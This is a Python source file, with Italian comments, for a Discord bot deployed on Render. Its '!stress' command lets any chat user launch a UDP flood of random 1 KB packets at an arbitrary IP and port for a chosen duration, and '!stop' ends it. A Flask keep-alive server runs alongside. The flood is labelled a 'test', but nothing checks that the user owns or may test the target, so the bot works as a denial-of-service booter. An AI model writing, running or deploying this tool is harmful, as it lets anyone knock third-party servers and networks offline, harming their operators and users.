import discord
from discord.ext import commands
import socket
import os
import asyncio
import threading
from flask import Flask
from threading import Thread

# --- SEZIONE FLASK PER UPTIME ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run_flask():
    # Render assegna una porta dinamica, dobbiamo leggerla dalle variabili d'ambiente
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.start()
    
# Configuriamo il bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Variabile per gestire l'interruzione dei test
active_tests = {}

async def udp_flood(ip, port, duration, test_id):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_packet = os.urandom(1024) # Pacchetto da 1KB
    timeout = asyncio.get_event_loop().time() + duration
    
    while asyncio.get_event_loop().time() < timeout:
        if not active_tests.get(test_id, True):
            break
        client.sendto(bytes_packet, (ip, port))
        await asyncio.sleep(0) # Permette al bot di non bloccarsi

@bot.command()
async def stress(ctx, ip: str, port: int, duration: int = 60):
    test_id = f"{ip}:{port}"
    active_tests[test_id] = True
    
    await ctx.send(f"🚀 Test avviato su **{ip}:{port}** per {duration} secondi.")
    
    try:
        await asyncio.wait_for(udp_flood(ip, port, duration, test_id), timeout=duration+5)
    except asyncio.TimeoutError:
        pass
    
    active_tests.pop(test_id, None)
    await ctx.send(f"✅ Test su {ip} terminato.")

@bot.command()
async def stop(ctx, ip: str, port: int):
    test_id = f"{ip}:{port}"
    if test_id in active_tests:
        active_tests[test_id] = False
        await ctx.send(f"🛑 Test su {test_id} interrotto manualmente.")
    else:
        await ctx.send("Non ci sono test attivi su quell'indirizzo.")

# Recupera il token dalle variabili d'ambiente di Render
token = os.getenv("DISCORD_TOKEN")
bot.run(token)
